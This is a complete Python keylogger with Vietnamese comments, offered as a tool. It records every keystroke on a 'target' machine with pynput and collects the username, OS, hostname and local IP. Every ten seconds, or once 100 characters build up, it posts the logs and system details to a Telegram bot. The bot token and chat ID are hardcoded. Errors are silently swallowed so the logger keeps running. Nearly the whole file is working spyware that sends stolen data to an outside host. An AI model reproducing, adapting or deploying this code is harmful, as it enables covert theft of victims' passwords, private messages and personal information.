# ========================================
# KEYLOGGER COMPACT - Phiên bản rút gọn 75 dòng
# Chức năng: Theo dõi phím bấm và gửi về Telegram
# ========================================

# Import các thư viện cần thiết
import requests      # Gửi HTTP request đến Telegram API
import time          # Xử lý thời gian, delay
import threading     # Chạy đa luồng để gửi định kỳ
import platform      # Lấy thông tin hệ điều hành
import socket        # Lấy thông tin mạng (IP, hostname)
import getpass       # Lấy tên người dùng hiện tại
from datetime import datetime  # Xử lý ngày giờ

# Import thư viện keylogger
try:
    from pynput.keyboard import Key, Listener  # Bắt sự kiện phím bấm
except ImportError:
    exit(1)  # Thoát nếu không có pynput

# ========================================
# CẤU HÌNH TELEGRAM BOT
# ========================================
BOT_TOKEN = '8386791229:AAFFD9PXULOXqNOjOrbSPd9nuMHlofCPS2E'  # Token bot Telegram
CHAT_ID = '5050166172'                                          # ID chat nhận tin nhắn
TELEGRAM_API_URL = 'https://api.telegram.org/bot{}/sendMessage'.format(BOT_TOKEN)

# ========================================
# CẤU HÌNH KEYLOGGER
# ========================================
LOG_CHAR_LIMIT = 100    # Gửi log khi đạt 100 ký tự
SEND_INTERVAL = 10      # Gửi log định kỳ mỗi 10 giây

# ========================================
# BIẾN LƯU TRỮ DỮ LIỆU
# ========================================
full_log = ''           # Lưu toàn bộ phím đã bấm
word = ''               # Lưu từ đang được gõ

# ========================================
# HÀM THU THẬP THÔNG TIN HỆ THỐNG
# ========================================
def get_system_info():
    """
    Thu thập thông tin cơ bản về máy tính target
    Trả về: Chuỗi chứa thông tin hệ thống được format
    """
    # Tạo danh sách thông tin cơ bản
    info = [
        "📅 Scan Time: {}".format(datetime.now().strftime('%Y-%m-%d %H:%M:%S')),  # Thời gian quét
        "👤 Current User: {}".format(getpass.getuser()),                          # Tên người dùng
        "🖥️ OS: {} {}".format(platform.system(), platform.release())             # Hệ điều hành
    ]
    
    # Thử lấy địa chỉ IP nội bộ
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        info.append("🌐 Local IP: {}".format(local_ip))
    except:
        info.append("🌐 Local IP: Không xác định được")
    
    # Trả về chuỗi thông tin, mỗi dòng cách nhau bởi \n
    return '\n'.join(info)

# ========================================
# HÀM GỬI DỮ LIỆU QUA TELEGRAM
# ========================================
def send_telegram(msg):
    """
    Gửi tin nhắn đến Telegram bot
    Args: msg - Nội dung tin nhắn cần gửi
    Return: True nếu gửi thành công, False nếu lỗi
    """
    try:
        # Gửi POST request đến Telegram API
        response = requests.post(TELEGRAM_API_URL, data={'chat_id': CHAT_ID, 'text': msg}, timeout=5)
        return True  # Gửi thành công
    except:
        return False  # Có lỗi xảy ra

def send_log():
    """
    Gửi log phím bấm qua Telegram và xóa log cũ
    """
    global full_log
    
    # Kiểm tra xem có dữ liệu để gửi không
    if full_log.strip():
        msg = full_log.strip()
        
        # Telegram giới hạn 4096 ký tự/tin nhắn
        if len(msg) > 4096:
            msg = msg[-4096:]  # Lấy 4096 ký tự cuối
        
        # Gửi log với prefix [KEYLOG] và xóa log nếu gửi thành công
        if send_telegram('[KEYLOG] {}'.format(msg)):
            full_log = ''  # Xóa log đã gửi

def periodic_send():
    """
    Hàm chạy trong thread riêng để gửi log định kỳ
    Gửi log mỗi SEND_INTERVAL giây nếu có dữ liệu
    """
    while True:
        time.sleep(SEND_INTERVAL)      # Chờ theo chu kỳ đã định
        if full_log.strip():           # Nếu có log chưa gửi
            send_log()                 # Thì gửi đi

# ========================================
# HÀM XỬ LÝ SỰ KIỆN PHÍM BẤM
# ========================================
def on_press(key):
    """
    Hàm callback được gọi mỗi khi có phím được bấm
    Args: key - Đối tượng phím được bấm từ pynput
    """
    global word, full_log
    
    try:
        # Xử lý phím SPACE - kết thúc một từ
        if key == Key.space:
            word += ' '                # Thêm dấu cách vào từ
            full_log += word          # Lưu từ vào log tổng
            word = ''                 # Reset từ hiện tại
            
        # Xử lý phím ENTER - xuống dòng
        elif key == Key.enter:
            word += '\n'              # Thêm ký tự xuống dòng
            full_log += word          # Lưu vào log tổng  
            word = ''                 # Reset từ hiện tại
            
        # Xử lý phím TAB
        elif key == Key.tab:
            word += '[TAB]'           # Đánh dấu phím TAB
            
        # Xử lý phím BACKSPACE - xóa ký tự
        elif key == Key.backspace:
            if word:                  # Nếu đang có từ thì xóa ký tự cuối từ
                word = word[:-1]
            else:                     # Nếu không có từ thì xóa ký tự cuối log
                full_log = full_log[:-1]
                
        # Bỏ qua các phím modifier (Shift, Ctrl, Alt)
        elif key in (Key.shift_l, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r):
            return
            
        # Phím ESC - dừng keylogger
        elif key == Key.esc:
            send_log()                # Gửi log cuối cùng
            return False              # Dừng listener
            
        # Xử lý các phím khác (chữ, số, ký tự đặc biệt)
        else:
            try:
                # Nếu là ký tự thông thường (a-z, 0-9, ...)
                if key.char is not None:
                    word += key.char
                # Nếu là phím đặc biệt khác (F1, Home, ...)
                else:
                    word += "[{}]".format(key.name.upper())
            except AttributeError:
                # Xử lý các phím không có thuộc tính char
                word += "[{}]".format(str(key).replace('Key.', '').upper())
        
        # Kiểm tra xem log đã đạt giới hạn chưa
        if len(full_log) >= LOG_CHAR_LIMIT:
            send_log()                # Gửi log khi đạt giới hạn
            
    except:
        pass  # Bỏ qua mọi lỗi để keylogger không bị crash

# ========================================
# HÀM CHÍNH - ĐIỀU KHIỂN CHƯƠNG TRÌNH
# ========================================
def main():
    """
    Hàm main điều khiển luồng chính của keylogger:
    1. Gửi thông báo bắt đầu
    2. Gửi thông tin hệ thống 
    3. Khởi động thread gửi định kỳ
    4. Bắt đầu lắng nghe phím bấm
    5. Gửi thông báo kết thúc
    """
    
    # BƯỚC 1: Gửi thông báo keylogger đã khởi động
    start_msg = "🚀 Keylogger started at {}\n📱 Target: {}@{}".format(
        time.strftime('%Y-%m-%d %H:%M:%S'),  # Thời gian bắt đầu
        getpass.getuser(),                    # Tên user
        socket.gethostname()                  # Tên máy tính
    )
    send_telegram(start_msg)
    
    # BƯỚC 2: Thu thập và gửi thông tin hệ thống
    system_info = get_system_info()
    send_telegram('[SYSTEM INFO]\n{}'.format(system_info))
    
    # BƯỚC 3: Khởi động thread gửi log định kỳ (chạy ngầm)
    periodic_thread = threading.Thread(target=periodic_send, daemon=True)
    periodic_thread.start()
    
    # BƯỚC 4: Bắt đầu lắng nghe phím bấm (chặn luồng chính)
    with Listener(on_press=on_press) as listener:
        listener.join()  # Chờ cho đến khi listener dừng
    
    # BƯỚC 5: Gửi thông báo keylogger đã dừng
    stop_msg = "🛑 Keylogger stopped at {}".format(time.strftime('%Y-%m-%d %H:%M:%S'))
    send_telegram(stop_msg)

# ========================================
# KHỞI CHẠY CHƯƠNG TRÌNH
# ========================================
if __name__ == "__main__":
    main()  # Chạy hàm chính
